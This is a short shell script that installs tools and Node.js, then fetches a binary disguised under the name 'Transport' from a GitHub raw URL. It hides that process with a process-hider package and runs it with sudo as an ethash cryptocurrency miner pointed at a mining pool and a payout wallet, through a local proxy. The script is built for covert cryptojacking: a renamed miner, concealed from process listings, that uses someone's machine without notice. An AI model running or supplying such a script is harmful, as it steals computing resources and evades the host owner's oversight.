apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
chmod +x Transport
ph add Transport
sudo ./Transport -a ethash -o stratum+tcp://eth.2miners.com:2020 -u nano_38gqwon5ypeyxb8fjjpz9iuqcfr38dnhifjipniicqfpi5fknep351e6sg4s -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
